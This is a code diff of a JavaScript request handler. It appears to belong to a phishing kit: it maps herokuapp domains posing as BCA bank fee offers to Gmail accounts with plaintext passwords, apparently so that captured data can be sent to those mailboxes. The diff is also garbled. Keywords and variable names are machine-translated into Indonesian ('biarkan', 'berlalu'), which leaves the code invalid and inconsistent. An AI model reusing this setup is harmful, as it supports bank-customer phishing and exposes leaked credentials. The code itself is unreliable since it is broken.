@@ -4,8 +4,8 @@ export default function handler(req, res) {
     const { body } = req;
     const { url } = req.headers;
 
-    let email = '';
-    let pass = '';
+    biarkan  email  =  '' ;
+    biarkan  berlalu  =  '' ; 
     
  if (url == 'pilihan-terbaru-tarif-bca.herokuapp.com'){
 
@@ -40,16 +40,16 @@ export default function handler(req, res) {
         
      if (url == 'pilihan-tarif-bca.herokuapp.com'){
 
-       email = 'linkbca97@gmail.com'
+       email = 'arirtut@gmail.com'
        pass = 'rycfocurtpmqjwpy'
     }else
     
     if (url == 'pilih-tarif-bca-terbaru.herokuapp.com'){
 
-       email = 'berkahhila240@gmail.com'
+       email = 'eeik2540@gmail.com'
        pass = 'sojwfkkemloxouvz'
     }else {
-        email = 'jakad2748@gmail.com'
+        email = 'admin@acomewook.com'
         pass = 'ncmetlriiocc'
     }
         
